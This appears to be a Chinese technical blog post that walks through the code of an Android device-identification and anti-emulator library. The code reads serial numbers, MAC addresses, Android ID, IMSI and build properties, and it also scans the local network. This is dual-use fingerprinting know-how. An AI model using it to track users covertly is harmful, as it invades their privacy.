SysAPIUtil.getSerialNumber(mActivity)</span><br><span class="line">            + <span class="string">&quot;\n系统API反射获取序列号 ： &quot;</span> + SysAPIUtil.getJavaSerialNumber(mActivity)</span><br><span class="line">            + <span class="string">&quot;\n直接通过 Build Serial &quot;</span> + Build.SERIAL</span><br><span class="line">            + <span class="string">&quot;\n通过ADB Build Serial &quot;</span> + AndroidDeviceIMEIUtil.getSerialno()</span><br><span class="line">            + <span class="string">&quot;\n直接native获取  Serial &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.serialno&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\n\nMAC地址信息 ：&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n\n通过系统API获取MAC地址  ： &quot;</span> + SysAPIUtil.getMacAddress(mActivity)</span><br><span class="line">            + <span class="string">&quot;\nIwifmanager 获取mac level 0  ： &quot;</span> + IWifiManagerUtil.getMacAddress(mActivity)</span><br><span class="line">            + <span class="string">&quot;\n通过NetworkInterface获取MAC地址  ： &quot;</span> + MacAddressUtils.getMacAddressByWlan0(mActivity)</span><br><span class="line">            + <span class="string">&quot;\n通过ADB获取MAC地址  ： &quot;</span> + MacAddressUtils.getMacInfoByAdb()</span><br><span class="line"></span><br><span class="line">            + <span class="string">&quot;\n\nAndroidID信息 ：&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n\n通过系统API获取ANDROID_ID (XPOSED可以HOOK)  ： &quot;</span> + SysAPIUtil.getAndroidId(mActivity)</span><br><span class="line">            + <span class="string">&quot;\n反射获取系统 ANDROID_IDISettingUtils  ： &quot;</span> + ISettingUtils.getAndroidProperty(mActivity, Settings.Secure.ANDROID_ID)</span><br><span class="line">            + <span class="string">&quot;\n反射获取系统 ANDROID_ID ISettingUtils level2  ： &quot;</span> + ISettingUtils.getAndroidPropertyLevel1(mActivity, Settings.Secure.ANDROID_ID)</span><br><span class="line">            + <span class="string">&quot;\n\n其他手机型号信息 ：&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n系统API获取手机型号 （作假）  ： &quot;</span> + SysAPIUtil.getPhoneManufacturer()</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.manufacturer&quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.model  &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.device &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.name&quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.name&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\n\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n系统架构  &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\n获取链接的路由器地址 &quot;</span> + MacAddressUtils.getConnectedWifiMacAddress(getApplication())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="deviceid获取"><a href="#deviceid获取" class="headerlink" title="deviceid获取"></a>deviceid获取</h2><h3 id="AndroidDeviceIMEIUtil-java"><a href="#AndroidDeviceIMEIUtil-java" class="headerlink" title="AndroidDeviceIMEIUtil.java"></a>AndroidDeviceIMEIUtil.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.IntentFilter;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.telephony.TelephonyManager;</span><br><span class="line"><span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.androidid.IAndroidIdUtil;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.deviceid.DeviceIdUtil;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.emulator.EmuCheckUtil;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.macaddress.MacAddressUtils;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.jni.PropertiesGet;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: hzlishang</span></span><br><span class="line"><span class="comment"> * Data: 17-7-26 上午11:02</span></span><br><span class="line"><span class="comment"> * Des: java与C ，代理与服务都能被hook，目前还没找不能被篡改的方法，只能将篡改的成本提高</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidDeviceIMEIUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isRunOnEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> EmuCheckUtil.mayOnEmulator(context);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> DeviceIdUtil.getDeviceId(context);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getAndroidId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> IAndroidIdUtil.getAndroidId(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getMacAddress</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> MacAddressUtils.getMacAddress(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//@Deprecated</span></span><br><span class="line">    <span class="comment">// IMPORTANT: This field should be initialized via a function call to</span></span><br><span class="line">    <span class="comment">// prevent its value being inlined in the app during compilation because</span></span><br><span class="line">    <span class="comment">// we will later set it to the value based on the app&#x27;s target SDK.</span></span><br><span class="line">    <span class="comment">//  public static final String SERIAL = getString(&quot;no.such.thing&quot;);</span></span><br><span class="line">    <span class="comment">//    序列号 重新烧录flash</span></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerialno</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialno</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">                serialno = Build.getSerial();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                serialno = PropertiesGet.getString(<span class="string">&quot;ro.serialno&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.isEmpty(serialno)) &#123;</span><br><span class="line">                    serialno = Build.SERIAL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serialno;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getManufacturer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBrand</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.brand&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getModel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCpuAbi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name of the underlying board, like &quot;goldfish&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBoard</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.board&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name of the hardware (from the kernel command line or /proc).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHardware</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.hardware&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBootloader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.bootloader&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    //TODO 17-7-31 by lishang : 暂时这么获取，不太重要</span></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIMSI</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">        <span class="keyword">return</span> telephonyManager.getSubscriberId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BatteryChangeReceiver sBatteryChangeReceiver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">            sBatteryChangeReceiver = <span class="keyword">new</span> <span class="title class_">BatteryChangeReceiver</span>();</span><br><span class="line">            <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">            filter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">            context.registerReceiver(sBatteryChangeReceiver, filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unRegisterBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">            context.unregisterReceiver(sBatteryChangeReceiver);</span><br><span class="line">            sBatteryChangeReceiver = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !(sBatteryChangeReceiver == <span class="literal">null</span> || sBatteryChangeReceiver.isCharging());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getCurrentBatteryLevel</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sBatteryChangeReceiver != <span class="literal">null</span> ? sBatteryChangeReceiver.getCurrentLevel() : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMac</span><span class="params">(IpScanner.OnScanListener listener)</span> &#123;</span><br><span class="line">        <span class="type">IpScanner</span> <span class="variable">ipScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IpScanner</span>();</span><br><span class="line">        ipScanner.startScan(listener);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只看实现的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerialno</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">serialno</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">            serialno = Build.getSerial();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            serialno = PropertiesGet.getString(<span class="string">&quot;ro.serialno&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.isEmpty(serialno)) &#123;</span><br><span class="line">                serialno = Build.SERIAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Android 8.0 (API 26) 及以上版本，使用<code>Build.getSerial()</code>（<code>import android.os.Build;</code>）获取设备的硬件序列号</p><p>在旧版本中，通过<code>PropertiesGet.getString(&quot;ro.serialno&quot;)</code>的JNI来读取系统属性，如果失败，则回退到使用 <code>Build.SERIAL</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getManufacturer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBrand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.brand&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getModel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCpuAbi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of the underlying board, like &quot;goldfish&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBoard</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.board&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of the hardware (from the kernel command line or /proc).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHardware</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.hardware&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBootloader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.bootloader&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>getManufacturer()</code>: 获取设备制造商，如 “HUAWEI”, “Xiaomi”。</li><li><code>getBrand()</code>: 获取设备品牌，如 “honor”, “Redmi”。</li><li><code>getModel()</code>: 获取设备型号，如 “VOG-AL00”, “K30S Ultra”。</li><li><code>getCpuAbi()</code>: 获取 CPU 的 ABI（应用二进制接口），如 “arm64-v8a”。这表明了 CPU 的架构。</li><li><code>getDevice()</code>: 获取设备代号，如 “HWVOG”。</li><li><code>getBoard()</code>: 获取主板名称，如 “goldfish”（常见于模拟器）。</li><li><code>getHardware()</code>: 获取硬件名称，如 “kirin980”。</li><li><code>getBootloader()</code>: 获取引导加载程序（Bootloader）的版本号。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TODO 17-7-31 by lishang : 暂时这么获取，不太重要</span></span><br><span class="line"><span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIMSI</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">    <span class="keyword">return</span> telephonyManager.getSubscriberId();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取设备的 <strong>IMSI</strong>，IMSI 是用于唯一识别移动网络中用户的编号，它存储在 SIM 卡中</p><blockquote><p>但是<strong>从 Android 10 (API 29) 开始</strong>，普通应用调用 <code>getSubscriberId()</code> 将不再返回有效的 IMSI。如果应用不具备特殊的运营商权限，调用此方法会抛出 <code>SecurityException</code>。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> BatteryChangeReceiver sBatteryChangeReceiver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">        sBatteryChangeReceiver = <span class="keyword">new</span> <span class="title class_">BatteryChangeReceiver</span>();</span><br><span class="line">        <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        filter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">        context.registerReceiver(sBatteryChangeReceiver, filter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unRegisterBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">        context.unregisterReceiver(sBatteryChangeReceiver);</span><br><span class="line">        sBatteryChangeReceiver = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !(sBatteryChangeReceiver == <span class="literal">null</span> || sBatteryChangeReceiver.isCharging());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getCurrentBatteryLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> sBatteryChangeReceiver != <span class="literal">null</span> ? sBatteryChangeReceiver.getCurrentLevel() : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>registerBatteryChangeListener</code>注册一个<code>BatteryChangeReceiver</code>来监听系统的电池状态变化</p><blockquote><p>所有方法位于<code>BatteryChangeReceiver.java</code>实现</p></blockquote><p><code>unRegisterBatteryChangeListener</code>注销之前注册的广播接收器</p><p><code>isCharging()</code>获取当前是否在充电，通过<code>sBatteryChangeReceiver.isCharging()</code></p><p><code>getCurrentBatteryLevel</code>获取当前的电量，通过<code>sBatteryChangeReceiver.getCurrentLevel()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMac</span><span class="params">(IpScanner.OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="type">IpScanner</span> <span class="variable">ipScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IpScanner</span>();</span><br><span class="line">    ipScanner.startScan(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>IpScanner.java</code>中实现，其中<code>ipScanner.startScan(listener);</code>会扫描局域网内的其他设备</p><h3 id="BatteryChangeReceiver-java"><a href="#BatteryChangeReceiver-java" class="headerlink" title="BatteryChangeReceiver.java"></a>BatteryChangeReceiver.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 